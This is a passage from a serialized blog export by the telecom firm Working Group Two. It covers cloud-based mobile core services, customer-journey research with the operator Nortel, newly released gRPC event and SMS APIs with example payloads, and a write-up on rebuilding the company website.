**Deployment**    |                                       Customer specific                                       |                               Common platform used by all customers                              |\\n|      **Support**      |                                    Customer-specific team                                     |                                            Shared team                                           |\\n| **Change Management** |              Contractual negotiation \u2013 change  Requests and specification cycles              |                   Frequent platform updates, constant  feedback from customers                   |\\n|        **SLA**        |    Process-defined \u2013 requires extensive list of activities to be defined, targets and costs   |                Service-defined \u2013 availability and quality of the service provided                |\\n|      **Contract**     | High upfront cost to define scope and  terms; difficult and expensive to change  subsequently |                  Standardized contract terms, based on simple to understand SLAs                 |\\n|   **Business Model**  |                         Fixed cost envelope, no incentive to  innovate                        | Usage-based model, incentivized to make changes that improve customer experience/service quality |\\n|        **R&D**        |                             No dedicated resources to support R&D                             |                       Direct flow through from core R&D to in-use platform                       |\\n\\nWhich column feels more exciting to you? \\n\\nClearly, Joe Parker, the CEO of CKH IOD, leans heavily to the right when he says this about taking the step of moving their core network to the public cloud:\\n\\n> \u201cOur collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency, and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT, and Private Network space. It\u2019s about achieving scale and the highest levels of security while reducing complexity \u2013 to the benefit of our customers and ultimately, end-users in our markets.\u201d\\n\\nOk, so there\u2019s a historical perspective with regards to managed services  to consider. Telecom workloads used to be considered extremely demanding, so you made hardware specifically for it - and then bundled the software. There was no such thing as the cloud, so you had to put your technology in every mobile operator basement. Making a change was almost impossible. Forget about driving micro innovations at scale. \\n\\nIn the modern day, where we do have a cloud - in all its varieties - and where the toolbox for change is available, there is still a lot of conservative thinking. Security and regulatory challenges are critical - but you need to find a way to frame and work with those challenges. \\n\\nBetter yet, think about the vendor of the future.\\n\\nOperators should encourage them to get better at what they are doing at lower costs. \\n\\nYou want to enable and incentivize them to increase your topline. It\u2019s by connecting the vendor\u2019s economic goals to your own by sharing revenue from more users and increased usage. With revenue share, the vendor wants to make the solution as good as possible. With a change request, the vendor wants to create the solution as cheaply as possible. \\nSo at the end of the day it is about aligning incentives. \\n\\n**At Working Group Two we don\u2019t want to charge for change requests.** We want to deliver micro innovation as a service at scale and win when our customers and their customers win. That\u2019s the only business case you should ever need to make. \\n\\nWe believe in a future where there are a smaller number of global mobile core platforms to which operators - big and small - can connect their radio networks. We think this will drive down the total cost of  core networks down by 30-50% and the pace of innovation up orders of magnitude."},{"id":"nortel-ecosystem","metadata":{"permalink":"/jp/blog/nortel-ecosystem","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-05-20-nortel-ecosystem/index.md","source":"@site/../blog/2022-05-20-nortel-ecosystem/index.md","title":"Building a product ecosystem: Here\'s a question mobile operators need to hear more often.","description":"\u201cCan I book you for a two-hour meeting so we can start sketching out your customer\'s journey?\u201d This is not a question that a telco operator normally hears.

But it was exactly this question that we asked the Head of Product at Nortel - a mobile operator targeting small and medium-sized businesses in Norway.\\n\\n\x3c!--truncate--\x3e\\n\\nWhy [Nortel?](https://www.nortel.no) Well we learned from their MVNe, eRate, that our product ecosystem will \\"be music to Nortel\'s ears\\". In a crowded market with established players, Nortel has been on the lookout for something that could differentiate them from their competitors - the product ecosystem is that differentiator, where according to Nortel\u2019s COO:  \u201cThat\'s where we want to go, and we want to be unique. We want to be a step ahead.\u201d\\n\\nBut to really understand why our ecosystem was going to be \'music to Nortel\'s ears\', we needed to get a much deeper understanding of Nortel and their customers - enter user research. We could have chosen to take this easy, short-term route down *Assumption Avenue*:\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./dilbert.jpg\\").default}\\n/>\\n\\nWith 20+ years of user research under my belt, I knew that direct collaboration with our target audience, though more time-consuming, will result in more useful, easy to use, and desirable products and experiences - thus the initial two-hour meeting request. Being an operator, Nortel is one of our three target audiences (along with subscribers and product developers). And while Nortel may not be the actual target audience for the customer journey work we are doing with them  - their subscribers are - their deep knowledge of their user base, coupled with their ability to ultimately give us access to them, was a much more appealing option than taking a wrong turn on Assumption Ave.\\n\\n## Customer journey mapping with Nortel\\nCan you tell us a bit about your customers? What are the typical stages of their journey when they interact with you? What are they doing during each of the stages? What challenges are they facing? What opportunities do Nortel and wgtwo have together to address these challenges? These are some of the key questions we posed to Robert (CPO), Espen (COO), and Sigrid (Sales Ops/HR mgr).\\n\\nDuring three highly interactive sessions, we sketched out the customer journey on an online whiteboard. It started with this blank canvas:\\n\\n![](./canvas1.png)\\n\x3c!-- <img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto auto\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas1.png\\").default}\\n/> --\x3e\\n\\nSix hours later, it evolved into a customer journey rich with tasks, challenges, and opportunities:\\n\\n![](./canvas2.png)\\n\x3c!-- <img\\n  width=\\"40%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas2.png\\").default}\\n/> --\x3e\\n\\nBut how did we get there? In order to accomplish what we accomplished together, we needed Nortel to trust that we were doing the right thing, and it was worth their effort to take time out of their busy schedules. Robert described his motivation to participate this way:\\n\\n> \u201cWe have to be tactical when we are going to migrate to the wgtwo platform, and if you don\'t have some more additional features when the customer migrates, they\u2019ll  think \u2018what was the reason for doing this?\u2019 And so we have to wrap it with some nice features that will feel like an upgrade rather than just a SIM card change\u2026.What I want to finish with this exercise is to map how our customers\u2026can purchase these services.\u201d (Robert, Nortel CPO)\\n\\nWith motivation in place along with our blank journey canvas, we went to work. We defined their core users (both migrating and new) in the form of **personas**, whom Sigrid thought \u201cmatched their customers\u201d:\\n\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./carlbilder.png\\").default}\\n/>\\n\\n**Carl** owns a contracting business, and he\u2019s looking for an operator, who has a self-service system so he can focus less on onboarding and support and more on growing his business.\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./mikemerchant.png\\").default}\\n/>\\n\\n**Mike** is a current Nortel customer, who expects to migrate to Nortel\u2019s MVNO, but he just wants to make sure he doesn\u2019t have to pay more than he is paying now and hopefully he\u2019ll get a few \u2018carrots\u2019 along the way\\n\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./eddiewatts.png\\").default}\\n/>\\n\\n**Eddie** is an electrician, who very much needs reliable coverage so his boss (either Mike or Carl) can reach him and vice versa when a job needs to be done or a question needs an answer\\n\\nOur discussions taught us, among other things, the challenges along the journey for potential customers, for example, Carl to become aware of a small MVNO like Nortel in their \u2018discovery\u2019 stage; the difficulties they face in comparing different plans after they discover Nortel; the carrots for migrating customers like Mike to see the benefits of staying with Nortel or going over to a competitor; both Carl\u2019s and Mike\u2019s lack of faith, during the \u2018mapping the customer needs\u2019 stage, in a disruptor like Nortel to deliver both standard and add-on services at a comparable or better level as the \u2018big guys\u2019; the lack of compelling products for someone like Eddie to add to his subscription during the \u2018product delivery\u2019 stage; and both Mike and Carl\u2019s reliance on customer service to use their PBX in the \u2018request support\u2019 stage.\\n\\n## Participatory design and prioritizing the product roadmap\\nWith the help of the customer journey mapping process, all of these challenges became opportunities that Nortel and wgtwo have started to address in a number of highly engaged participatory design sessions.\\n\\nWe iterated several times on redesigning the experience of how Mike or Eddie can add, among other things, unique security or SMS enhancing features to their subscriptions in the below mockup that starts like this.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas3.png\\").default}\\n/>\\n\\nRobert\u2019s final positive assessment of this design work was summed up with the word \u201cbullseye\u201d in terms of our understanding of the personas\u2019 flows and in surfacing Nortel\u2019s desire to differentiate themselves.\\n\\nWe also learned about which products on our roadmap Nortel believed will resonate best with their business objectives and with their customers. We did this through some card sorting exercises, where we asked Nortel which product opportunities they considered \u2018need to have\u2019, \u2018nice to have\u2019, and \u2018not relevant\u2019 as illustrated here:\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas4.png\\").default}\\n/>\\n\\nTheir feedback will clearly help us determine which products we will make available on our platform for not only Nortel but other operators as well going forward.\\n\\nAfter a well-deserved social visit planned together for early June, during the next few months, we plan on working directly with some of Nortel\u2019s customers in the following areas:\\n\\n* running participatory design sessions on the subscriber experience\\n* discussing our product roadmap\\n* forming a charter customer program with subscribers to gather continuous and ongoing feedback\\n\\nWe would never have gotten as far as we\u2019ve gotten in understanding Nortel and their customers\u2019 problem space without being able to do this type of user research. So this will be our recipe going forward with those operators, who also hear beautiful music when learning about Working Group Two\u2019s product ecosystem.\\n\\nTo learn more, visit [our products ecosystem page](https://www.wgtwo.com/product-ecosystem/) or get in touch with us at [products@wgtwo.com](mailto:products@wgtwo.com)."},{"id":"vxt-joins-marketplace","metadata":{"permalink":"/jp/blog/vxt-joins-marketplace","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-03-21-vxt-to-join-marketplace/index.md","source":"@site/../blog/2022-03-21-vxt-to-join-marketplace/index.md","title":"Vxt is on a mission to eradicate boring tasks.

So now its time to step up our game.\\n\\nWe are releasing our first production ready gRPC APIs!\\n\\n\x3c!--truncate--\x3e\\nHave you ever received a welcome SMS when toggling flight mode off as you were on your way out of a plane starting off your awesome vacation? In this blog post we will describe our approach to supporting that vacation-feeling SMS, and how we transitioned to using gRPC streams to support it and greatly improve the flexibility of our platform.\\n\\n![](./welcome.png)\\n\\nAs a quick first version, we have implemented a service that listens to location update events happening in our core and decides whether a user has changed country or not according to our records of your previous and new location. If a user did change country, we would fire a simple POST request to a configured endpoint hosted by the operator with this information. This has for most parts been good enough to get the job done, but it creates an explicit dependency between our core and our partner operator service being up and responsive, which makes the solution prone to errors and makes the system less flexible.\\n\\nAt **wgtwo**, we are relying heavily on gRPC APIs, and we are now ready to officially release our first gRPC API after playing around with our v0 APIs for a long time.\\n\\nTo get notifications of a phone attaching to a network in another country, you may use our `StreamCountryChangeEvents` API.\\n\\nBy calling this API, you initiate a server stream where you will receive this type of event for your customers. The API requires that you send an acknowledgement message when you have successfully processed the event; failing to do so will make it resend after a given timeout.\\n\\nYou may control load for your clients by setting how many concurrent events should be in-flight, and you may create multiple connections to share load between your servers.  This gives both us and the users of our API greater flexibility in consuming events that happen in the core of our network, and it gives the caller of the API the freedom to react in a way they believe is best for their user base. This is true for all the event-type server streams we offer.\\n\\nAll in all, we feel that moving to gRPC, where we give the client flexibility in how these events should be consumed and protect the client from high load, is the right move. This is instead of spending energy on adding resending and failure handling to our previous solution.\\n\\n\\n### The APIs\\n\\n\\nOur first batch of gRPC APIs is listed below.\\n\\nAll our event-based APIs have a common metadata field, which contains the subscriber identifier (using Pairwise Pseudonymous Identifier) and the identifier used for acknowledging the messages. For brevity this is not included in the examples below.\\n\\n\\n#### StreamCountryChangeEvents\\n\\nThis one is explained in the intro section and will let you listen to a stream of events for when the SIM first attaches to a network in another country.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"countryChangeEvent\\": {\\n    \\"previous\\": {\\n      \\"code\\": \\"NO\\",\\n      \\"name\\": \\"Norway\\"\\n    },\\n    \\"current\\": {\\n      \\"code\\": \\"SE\\",\\n      \\"name\\": \\"Sweden\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get country change events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-country-change-events.html)\\n\\n\\n#### StreamHandsetChangeEvents\\n\\nThis lets you listen to a stream of events for when a SIM attaches via a new handset. This is typically used for sending you new APN settings as you set up your new phone.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"handsetChangeEvent\\": {\\n    \\"previous\\": {\\n      \\"imeiSv\\": {\\n        \\"imei\\": \\"86700000000000\\",\\n        \\"softwareVersion\\": \\"64\\"\\n      }\\n    },\\n    \\"current\\": {\\n      \\"imeiSv\\": {\\n        \\"imei\\": \\"86700000000001\\",\\n        \\"softwareVersion\\": \\"65\\"\\n      }\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"(...)\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get handset change events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-handset-change-events.html)\\n\\n\\n#### StreamFirstAttachmentEvents\\n\\nThis lets you listen to a stream of events for when the SIM attaches to the network for the first time. In other words, it gives an operator a simple way to see that a SIM has been taken in use.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"firstAttachmentEvent\\": {\\n    \\"number\\": {\\n      \\"e164\\": \\"+47xxxxxxxx\\",\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"24206000010001\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get first attachment events\\n](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-first-attachment-events.html)\\n\\n\\n#### StreamPeriodicCountryEvents\\n\\nThis API has some similarities to the StreamCountryChangeEvents API. It will periodically send events related to the country a SIM card is located in.\\n\\nThis may be used if you want a message to be sent out when a user has a longer stay in another country, and you want to ensure the user has the required information about roaming prices.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"periodicCountryEvent\\": {\\n    \\"number\\": {\\n      \\"e164\\": \\"+4799990000\\"\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"242010000000000\\"\\n    },\\n    \\"country\\": {\\n      \\"code\\": \\"SE\\",\\n      \\"name\\": \\"Sweden\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get periodic country events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-periodic-country-events.html)\\n\\n\\n#### SMS APIs\\n\\nWe have also launched three SMS APIs, which will be covered more in depth in a later post:\\n\\n\\n##### Send text SMS from subscriber\\n\\nThis allows you to text messages from a subscriber to any phone number.\\n\\n\\n##### Send text SMS to subscriber\\n\\nThis allows a service to send regular text messages to a subscriber from either a phone number or an alphanumeric sender ID.\\n\\n\\n##### Send data SMS to subscriber\\n\\nThis allows a service to send binary messages to a subscriber from either a phone number or an alphanumeric sender ID.\\n\\nThis may be used to, for example, send APN settings when your subscribers swap phones.\\n\\n\\n### Why we chose gRPC\\n\\nUsing gRPC, our published proto-files are the contract for our APIs. This makes documentation easier, and makes it easy to ensure we don\u2019t break our existing APIs.\\n\\nMany of the APIs listed here are streaming APIs. In our experience gRPC makes implementing streams easy. We do also use protobufs a lot internally, and we have found that it helps us implement changes in a non-breaking way and has also aided us in making communication between services written in different languages work without too much hassle.\\n\\n\\n### Our API playground\\n\\nA lot of our APIs are still in v0. The v0 APIs is our playground where we have been testing out what functionality we actually need, and how we can expose that in a way that is easy to use.\\n\\nThis includes APIs for receiving SMS, building WebRTC clients, setting up SIP integrations, and more.\\n\\nFor production usage, we do recommend that you stick to our released APIs as we may make breaking changes to our v0 APIs without any notice. You are however free to use them for demo purposes, and we would be very happy to receive feedback if there is anything you need to build your next product.\\n\\nIf you have any questions, feel free to reach out at products@wgtwo.com and visit our docs website for a deeper dive and more code examples of the various APIs we provide: https://v1.docs.wgtwo.com/."},{"id":"new-website","metadata":{"permalink":"/jp/blog/new-website","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-02-25-website-redesign/index.md","source":"@site/../blog/2022-02-25-website-redesign/index.md","title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","description":"For a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision.","date":"2022-02-25T00:00:00.000Z","formattedDate":"February 25, 2022","tags":[{"label":"website","permalink":"/jp/blog/tags/website"},{"label":"react","permalink":"/jp/blog/tags/react"}],"readingTime":16.85,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"}],"frontMatter":{"slug":"new-website","title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","tags":["website","react"],"authors":["jonny-griffin"],"image":"./wgtwo-home-3.0.png"},"prevItem":{"title":"We are releasing our first production-ready gRPC APIs!","permalink":"/jp/blog/releasing-our-first-grpc-apis"},"nextItem":{"title":"Manual on Me: Matt Long","permalink":"/jp/blog/manual-on-me-matt-long"}},"content":"import { ImgComparisonSlider } from \'@img-comparison-slider/react\';\\nimport Image from \\"@theme/IdealImage\\";\\nimport styles from \\"./styles.css\\";\\nimport Highlight from \'@site/src/components/highlight/Highlight\';\\n\\nFor a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision. \\nThis blog post illustrates my approach to taking the content of our existing website and transforming it into a completely new online presence, what it is today. This is the story of leveraging the Pareto 80/20 Principle to effectively portray **wgtwo** as the innovative telco brand it is.\\n\\n\x3c!--truncate--\x3e\\n\\n<center><b><Highlight color=\\"#000\\">wgtwo.com 2.0 => wgtwo.com 3.0</Highlight></b></center>\\n<center><i>before and after</i></center>\\n\\n<ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n    <img slot=\\"first\\" src={require(\'!file-loader!./wgtwo-home-2.0.png\').default} />\\n    <img slot=\\"second\\" src={require(\'!file-loader!./wgtwo-home-3.0.png\').default} />\\n</ImgComparisonSlider>\\n\\n#### Background\\n\\nI recently [listened to a podcast](https://open.spotify.com/episode/0MIeRQGAUcVW2qx2YrO7nn?si=c5d127ab6181434d) about a CEO making her biggest mistake - not promoting within her company. She was pressured into hiring an external CEO to fill her position while she could focus on leading the design initiatives. Long story short, this was her biggest mistake and she learned that promoting people from within the company leads to better results.\\n\\nOutsourcing the design of our website, this podcast made it clear to me why it failed to show the true identity of **wgtwo**. What we needed was a clear storyline, dialogue, and understanding of the Insider to simplify and structure the content, giving the viewer an intuitive understanding. \\n\\nAt **wgtwo** we have a startup culture where we build initiatives from the ground up - self-doing and empowering the developer. The company promotes this concept on a semi-quarterly basis through hackdays - where we creatively solve complex problems and build new solutions for our telco core network or learn a new programming language.\\n\\nKnowing the inner workings of our technology and services and having a hidden passion for creating websites I was in the perfect position to change reality. One day during a daily standup, the inner spark was lit and it was go time.\\n:::tip Steps taken for building a new website\\nStep 1: setting the objectives  \\nStep 2: understand the 5 main issues of the wgtwo online presence   \\nStep 3: come up with strategies to solve  \\nStep 4: organize important content and design away - tell a story  \\nStep 5: code it up  \\n:::\\n\\n## Step 1: Objectives\\n\\n### 80/20 Principle\\n\\nBefore diving into the nitty-gritty details of how I achieved to build a new website in a week, I wanted to briefly discuss the concept of the [Pareto 80/20 Principle](https://en.wikipedia.org/wiki/Pareto_principle). Essentially, if someone is not aware of the concept, it has been around for a while but in theory, is a concept that has been applied and proven by many economists. This principle can be applied to wealth, consumption, consequences, and most importantly output and results.\\n\\n:::info 80/20 Principle High Level\\n\u276f the majority, that has little impact  \\n\u276f the small minority, that has a major, dominant impact \\n\\n20% input = 80% output  \\n20% effort = 80% results\\n\\n80% = Done\\n:::\\n\\nFor the website, it was important to focus on, what is our 20% input. If a task comes to the table then it was important to know the importance of the task, and how much time should be spent on this. I will be referencing back to this 20% input and 80% output. For our context, 80% is a completed website.\\n\\n### Objectives\\n\\nI needed a mechanism to scope the amount of work and be able to \\"grade\\" the work at the end to ensure I meet my goal and most importantly, not get distracted from the goal. Part of the 80/20 principle is to ensure that 20% of the work is done to achieve 80% of the output. \\n\\n#### Primary objectives (80%)\\n\\nA website is used by an audience. It was important to understand the end-user so I can ensure that their experience was prioritized. After brainstorming I came up with two scenarios:\\n\\n- Commercial: Convert potential customers from being interested in taking action\\n- Talent: Inspire software engineers to consider **wgtwo** as their next employer and start engaging with us\\n\\n#### *Secondary objectives*  \\n\\nAs our secondary objectives, these were still always in the back of our head but in theory, had less of a priority. There was some overlap with the primary objectives. In the end, however, I was able to also include this as part of the 80% website offering as a lot of the written content previously existed on the old website.\\n\\n- Third parties: Educate media, analysts, and third-party developers about the future of our industry and our offerings\\n- Internal: Be an active platform for external knowledge sharing by employees (docs, policies, case studies, blogs, etc)\\n\\n### Personas\\n\\nOk sweet, so now that I have our *finite goal* in mind, let\'s think about the personas related to achieving our goals and objectives. Specifically, I found that it made sense to have two groups of personas, *external and internal*. \\n\\n#### External audience\\n\\nWe can think about external audiences as who is using the website.\\n\\n* I am a technical manager at MVNO company x trying to learn about how **wgtwo** solves business problems for me\\n* I am a software engineer looking for a new challenge and job within the telco space\\n* I am an existing customer of **wgtwo** finding documentation to APIs and contact details\\n* I am an existing customer looking to find their security documentation\\n* I work at a news outlet (journalist, analyst, investors) trying to find more information about **wgtwo**\\n\\n> 2 out of 5 were true with the old website\\n\\nCreating these statements allowed me to think about what content is important and the organizational architecture. This gave us the criteria to then grade our content for each bullet point.\\n\\nAs an example, focusing a lot of time on creating a storyline was critical for answering the questions around content organization on what business problems **wgtwo** solves, hiring and recruiting, and links to our external products like API Docs and support portals, as they did not exist before. \\n\\n#### Internal audience\\n\\nIt was important to include internal personas as the website will be updated, maintained, and managed by whom, internal personas. Previously, the old wgtwo.com had a problem that the website was only updated by a select few in the sales team - but even then - an external request to a third-party company has to be made.\\n\\nWho and how will **wgtwo** be updating the website. In short, everyone will have access to the website and be able to update content. \\n\\n* I am an engineer looking to write a technical blog post in markdown\\n* I am the head of marketing looking to post company news about a new feature **wgtwo** deployed\\n* I am the head of marketing looking to update the header text on the homepage\\n* I am an engineer looking to add a new link to the APIs doc\\n* I am an engineer looking to add a new page about details of Voice\\n* I am the CTO looking to update our tech page as I have a new capability\\n* I am the CEO finding information about how I do XYZ for a sales chat\\n* I am a salesperson looking to add a case study\\n* I am a salesperson looking to find a link to more information to send to a customer \\n\\n> 2 out of 9 were true with the old website\\n\\nEssentially, from these bullet-point lists above, I reflected and see that well I have a technical and non-technical persona that needs to be able to update the website. I need something modern and scalable to allow rich and modern web content while basic text blog posts and documentation. This was important when determining the tech stack for the website.\\n\\n## Step 2,3,4: Problem Analysis and Solution\\n\\nThe bulk of the blog post will be this section. To help organize and communicate the problems, approach, and solution - there were a few domains that were clear to me that required work and altering. \\n\\nBefore tackling any problem listed before, it went through a process such as:\\n\\n1. **Problem**: Identity what was not working with the old website and keep a total list\\n2. **Approach**: Look back at the personas and objectives as mentioned earlier and come up with a definition of done (DoD)\\n3. **Solution**: Have an ordered priority list of action items that must be done. It was important to review this list multiple times to ensure that one item on this list did not take more than 20% of the time compared to the other items. \\n\\nOk, I am starting to get somewhere. Let\'s jump into some identified problem domains and see how I was able to achieve a cleaver solution and impact.\\n\\n### <Highlight color=\\"#000\\">Storyline</Highlight>\\n**Problem**: Unclear message of what the **wgtwo** business is.  \\n**Approach**: Envisioning different personas (mvno employee, 3rd party developer, journalist, future **wgtwo** employee) trying to explain the business in different ways. Essentially, how can I build an elevator pitch for the website viewer?    \\n**Solution**: Restructuring the existing content on the website, and intuitively creating a hierarchy of content. I achieved this via a landing homepage that is made up of several components.  \\n(Example homepage: Intro, Vision, product, existing customers, case studies for future customers, action to get in touch) \\n\\n<details>\\n  <summary>Homepage - Landing Page</summary>\\n  <div>\\n    <div>\\n        The old homepage displayed on the left and new on the right. The homepage here took the most about of time to complete, as this is the key page for the website. <br/><br/>\\n        <Highlight color=\\"#ef507f\\">What are we selling</Highlight> => <br/><Highlight color=\\"#000\\">Mobile Core Network</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No details on what the product is</Highlight> => <br/><Highlight color=\\"#000\\">Added a section of Console</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No information from existing customers</Highlight> => <br/><Highlight color=\\"#000\\">Added a testimonial</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">No sense of credibility</Highlight> => <br/><Highlight color=\\"#000\\">Logos with external links to business deals</Highlight><br/><br/>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./wgtwo-homepage-2.0-full.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./wgtwo-homepage-3.0-full.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Taking a page from Apple and Facebook</summary>\\n  <div>\\n    <div>\\n        When analyzing other websites, I noticed one similarity between them. Short descriptive text, with a <b>period</b>, and usage of <b>color</b>. \\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./facebook-messenger.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./ipad-mini.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">Branding</Highlight>\\n**Problem**: No clear **wgtwo** identity, different brand names / no clear \u201cslogan\u201d   \\n**Approach**: Understand our personas, business model, and decide on a central way to communicate our brand // analysis of existing content to understand how the brand should be communicated   \\n**Solution**: Working Group Two AS = company name, while when referencing our company, **wgtwo** in bold - all lowercase to match our logo // programmable, scalable, innovative \\n\\n<details>\\n  <summary>What\'s our company name?</summary>\\n  <div>\\n    <div>\\n        The old website had five different ways of writing our company name. 5. If we can\'t even get it right, how could someone else? Let\'s start and create a new standard for our name - as shown below!<br/><br/>\\n        <Highlight color=\\"#ef507f\\">Working Group 2</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">Working Group 2 As</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WorkingGroup2</Highlight> => <br/><Highlight color=\\"#000\\">Working Group Two AS</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WGTWO</Highlight> => <br/><Highlight color=\\"#000\\">wgtwo</Highlight><br/><br/>\\n        <Highlight color=\\"#ef507f\\">WG2</Highlight> => <br/><Highlight color=\\"#000\\">wgtwo</Highlight><br/><br/>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./branding-wg2.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./branding-wgtwo.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Word analysis</summary>\\n  <div>\\n      <div>\\n        Surprisingly, website 2.0 had some great text. A lot of work was spent to build content about the mobile core network space. From a statistically point of view, I wanted to try to analyze what words were most frequent across the website to get an idea of what words we should focus on as part of the homepage hero header text.<br/><br/>\\n        To achieve this, I had to run a script to download the HTML of the website, as we did not even own the source code of the website. Below you can see the small script I ran to recursively download all pages from the old website. From some small grepping, I found our that <Highlight color=\\"#000\\">innovation</Highlight> was one of the top lists.<br/><br/>\\n        <code>wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --domains wgtwo.com --no-parent wgtwo.com</code>\\n      </div>\\n    <br/>\\n    <img src={require(\'!file-loader!./innovation-25.png\').default} />\\n    <br/>\\n  </div>\\n</details>\\n\\n### <Highlight color=\\"#000\\">Content organization</Highlight>\\n**Problem**: Hidden content (too long paths)  \\n**Approach**: [Miro](https://www.mirco.com) board chart to understand the existing website structure and content  \\n**Solution**: everything accessible via <ins>one click</ins>, make more use out of the header and footer of the page\\n(Example: find the interview process page) \\n\\n<details>\\n  <summary>Mapping the website structure with Miro</summary>\\n  <div>\\n    <div>\\n        The goal of the new website was to make everything accessible from one click from the home page. If this meant a link in the footer, or a call to action within a component. It should be super clear as the viewer to understand where they are when navigating on the website.<br/><br/>\\n        This was a time consuming process to map out the structure of the old website but in doing so, it was / is quite clear that the new website has a huge improvement in readability.<br/><br/>\\n        <Highlight color=\\"#ef507f\\">27 pages</Highlight> => <Highlight color=\\"#000\\">8 pages</Highlight>\\n    </div>\\n    <br/>\\n    <ImgComparisonSlider class=\\"slider\\" hover=\\"hover\\">\\n        <img slot=\\"first\\" src={require(\'!file-loader!./structure-2.0.png\').default} />\\n        <img slot=\\"second\\" src={require(\'!file-loader!./structure-3.0.png\').default} />\\n    </ImgComparisonSlider>\\n    <br/>\\n  </div>\\n</details>\\n\\n<details>\\n  <summary>Product Ecosystem</summary>\\n  <div>\\n      <div>\\n        Analyzing the old website, I realized that the product ecosystem consisted of 5 pages with various dead-end links going to various other pages.

